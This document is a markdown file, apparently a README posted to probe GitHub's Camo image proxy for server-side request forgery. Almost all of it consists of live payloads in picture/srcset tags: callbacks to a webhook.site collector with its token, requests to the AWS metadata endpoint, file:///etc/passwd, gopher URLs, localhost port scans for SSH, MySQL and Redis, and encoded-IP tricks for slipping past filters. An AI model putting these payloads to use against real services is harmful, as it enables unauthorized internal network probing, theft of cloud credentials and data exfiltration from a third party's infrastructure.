# 🔬 SSRF Validation Tests

Testing GitHub Camo proxy SSRF vulnerability.

## Basic SSRF Confirmation
<picture>
  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-1-basic">
  <img src="https://via.placeholder.com/1x1.png" alt="Test 1">
</picture>

## Timing Attack Test (10s delay)
<picture>
  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-2-timing?delay=10">
  <img src="https://via.placeholder.com/1x1.png" alt="Timing Test">
</picture>

## Data Exfiltration Test
<picture>
  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-3-data?data=github-internal-secret">
  <img src="https://via.placeholder.com/1x1.png" alt="Data Test">
</picture>

## Header Analysis Test
<picture>
  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-4-headers">
  <img src="https://via.placeholder.com/1x1.png" alt="Header Test">
</picture>

## Redirect Following Test
<picture>
  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-5-redirect?step=1">
  <img src="https://via.placeholder.com/1x1.png" alt="Redirect Test">
</picture>

## DNS Rebinding Test
<picture>
  <source srcset="https://b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/ssrf-test-6-dns">
  <img src="https://via.placeholder.com/1x1.png" alt="DNS Test">
</picture>

## IPv6 Localhost Test
<picture>
  <source srcset="http://[::1]/ssrf-test-7-ipv6">
  <img src="https://via.placeholder.com/1x1.png" alt="IPv6 Test">
</picture>

## AWS Metadata Test
<picture>
  <source srcset="http://169.254.169.254/latest/meta-data/">
  <img src="https://via.placeholder.com/1x1.png" alt="AWS Metadata">
</picture>

## URL Encoding Bypass
<picture>
  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-8-encoded%3Fparam%3Dvalue">
  <img src="https://via.placeholder.com/1x1.png" alt="Encoded Test">
</picture>

## Alternative srcset Format
<picture>
  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-9-srcset 1x, https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-9-srcset-2x 2x">
  <img src="https://via.placeholder.com/1x1.png" alt="Srcset Format Test">
</picture>

## Protocol Handler Test - File
<picture>
  <source srcset="file:///etc/passwd">
  <img src="https://via.placeholder.com/1x1.png" alt="File Protocol">
</picture>

## Protocol Handler Test - Gopher
<picture>
  <source srcset="gopher://webhook.site:80/_GET%20/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/gopher">
  <img src="https://via.placeholder.com/1x1.png" alt="Gopher Protocol">
</picture>

## Internal Network Scan - Common Ports
<picture>
  <source srcset="http://127.0.0.1:22/ssrf-ssh">
  <img src="https://via.placeholder.com/1x1.png" alt="SSH Scan">
</picture>

<picture>
  <source srcset="http://127.0.0.1:3306/ssrf-mysql">
  <img src="https://via.placeholder.com/1x1.png" alt="MySQL Scan">
</picture>

<picture>
  <source srcset="http://127.0.0.1:6379/ssrf-redis">
  <img src="https://via.placeholder.com/1x1.png" alt="Redis Scan">
</picture>

## Decimal IP Encoding
<picture>
  <source srcset="http://2130706433/ssrf-decimal-localhost">
  <img src="https://via.placeholder.com/1x1.png" alt="Decimal IP">
</picture>

## Octal IP Encoding  
<picture>
  <source srcset="http://0177.0.0.1/ssrf-octal-localhost">
  <img src="https://via.placeholder.com/1x1.png" alt="Octal IP">
</picture>

## Hex IP Encoding
<picture>
  <source srcset="http://0x7f.0x0.0x0.0x1/ssrf-hex-localhost">
  <img src="https://via.placeholder.com/1x1.png" alt="Hex IP">
</picture>

---
**Webhook Token:** `b45a05ce-3f7d-4a49-9e5d-5a138dde5eca`
